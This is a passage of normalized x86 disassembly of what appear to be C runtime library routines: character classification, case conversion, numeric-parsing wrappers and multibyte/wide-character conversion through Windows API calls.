push [ ebp + 0x8 ]
call sub_4332af
pop ecx
pop ecx
pop ebp
retn
sub_4335de
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x103
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_4332ea
pop ecx
pop ecx
pop ebp
retn
sub_43360d
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x9
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_433325
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x40
pop ebp
retn
push 0x40
pop eax
pop ebp
retn
sub_433644
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x20
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_433368
pop ecx
pop ecx
pop ebp
retn
sub_433671
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_4333e6
pop ecx
pop ecx
pop ebp
retn
sub_43369e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x117
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_43341e
pop ecx
pop ecx
pop ebp
retn
sub_4336cd
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_433459
pop ecx
pop ecx
pop ebp
retn
sub_4336fa
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x157
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_433491
pop ecx
pop ecx
pop ebp
retn
sub_433729
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x10
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_4334cc
pop ecx
pop ecx
pop ebp
retn
sub_433756
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_433504
pop ecx
pop ecx
pop ebp
retn
sub_433783
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_43353c
pop ecx
pop ecx
pop ebp
retn
sub_4337b0
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
call sub_433574
pop ecx
pop ecx
pop ebp
retn
sub_4337df
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
lea ecx [ ebp - 0x1c ]
push ebx
push [ ebp + 0x10 ]
call sub_41cb44
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
xor eax eax
mov [ ebp - 0x4 ] ax
mov [ ebp - 0x2 ] al
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call sub_433a73
pop ecx
pop ecx
test al al
je r-xdata
call sub_42fef5
xor ecx ecx
mov [ eax ] 0x2a
xor eax eax
mov [ ebp - 0x4 ] bl
inc ecx
mov [ ebp - 0x3 ] al
mov eax ebx
lea ecx [ ebp - 0x18 ]
sar eax 0x8
mov [ ebp - 0xc ] eax
push ecx
movzx eax al
push eax
call sub_43f824
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x98 ]
movzx ecx [ eax + ebx ]
je r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x10 ] al
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] al
xor eax eax
push 0x2
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] al
pop ecx
jmp r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
mov [ ebp - 0x8 ] ax
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x6 ] al
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0xc ]
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_43fcef
add esp 0x24
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax edx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
jmp r-xdata
sub_433929
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
lea ecx [ ebp - 0x1c ]
push ebx
push [ ebp + 0x10 ]
call sub_41cb44
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
xor eax eax
mov [ ebp - 0x4 ] ax
mov [ ebp - 0x2 ] al
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call sub_433a90
pop ecx
pop ecx
test al al
je r-xdata
call sub_42fef5
xor ecx ecx
mov [ eax ] 0x2a
xor eax eax
mov [ ebp - 0x4 ] bl
inc ecx
mov [ ebp - 0x3 ] al
mov eax ebx
lea ecx [ ebp - 0x18 ]
sar eax 0x8
mov [ ebp - 0xc ] eax
push ecx
movzx eax al
push eax
call sub_43f824
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x10 ] al
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] al
xor eax eax
push 0x2
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] al
pop ecx
jmp r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
mov [ ebp - 0x8 ] ax
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x6 ] al
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0xc ]
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_43fcef
add esp 0x24
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax edx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
jmp r-xdata
sub_433a73
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x2
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_433a90
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_433b2d
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp eax 0x19
ja r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_433aec
pop ecx
pop ecx
mov ecx eax
jmp r-xdata
mov eax ecx
pop ebp
retn
add ecx 0x20
sub_433b5d
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x61 ]
cmp eax 0x19
ja r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_433b13
pop ecx
pop ecx
mov ecx eax
jmp r-xdata
mov eax ecx
pop ebp
retn
add ecx 0xffffffe0
sub_433b90
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
pop ebp
retn
mov [ ecx ] edx
sub_433bb0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
pop ebp
retn
mov [ ecx ] edx
sub_433bd0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433c00
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433c30
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433c60
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433c90
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433cc0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433cf0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433d20
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433d50
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push 0x0
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433d80
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433db0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433de0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433e10
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433e40
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push 0x0
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433e70
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433ea0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433ed0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433f00
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push [ ebp + 0x14 ]
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433f30
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push 0x0
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433f60
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433f90
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433fc0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_433ff0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434020
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push 0x0
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434050
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434080
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4340b0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4340e0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push [ ebp + 0x14 ]
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434110
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push 0x0
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434140
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push 0x0
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434170
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push 0x0
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4341a0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push 0x0
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4341d0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push 0x0
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434200
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433b90
add esp 0xc
push 0x0
call sub_42dca0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434230
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push 0x0
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434260
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push 0x0
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434290
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push 0x0
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4342c0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push 0x0
call sub_42d530
add esp 0x14
mov esp ebp
pop ebp
retn
sub_4342f0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push 0x0
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_434320
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_433bb0
add esp 0xc
push 0x0
call sub_42df60
add esp 0x14
mov esp ebp
pop ebp
retn
sub_43434d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
mov eax [ ebp - 0xc ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
movzx eax [ esi ]
push eax
call sub_43f824
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
inc edi
push edi
push esi
push 0x9
push [ eax + 0x8 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0xc ]
cmp [ edi + 0x4 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_42fef5
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x4 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x4 ]
push esi
push 0x9
push [ edi + 0x8 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0xc ]
test eax eax
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ edi + 0x4 ]
jmp r-xdata
sub_434461
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_41cb44
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push eax
call sub_4344b4
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x14 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_4344b4
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x14 ]
call sub_41cb44
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
push [ eax + 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_42fef5
push 0x2a
pop esi
mov [ eax ] esi
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x14 ]
and [ ecx + 0x350 ] 0xfffffffd
call sub_42fef5
push 0x22
pop esi
mov [ eax ] esi
call sub_42fdcf
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_40de60
add esp 0xc
push edi
push esi
push ebx
call sub_40de60
add esp 0xc
sub_4345d5
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0xc ]
call sub_439554
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_4344b4
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_434626
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0x1f
push 0x20
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax ecx
mov edx [ ebp + 0xc ]
add edx ecx
cmp ecx edx
je r-xdata
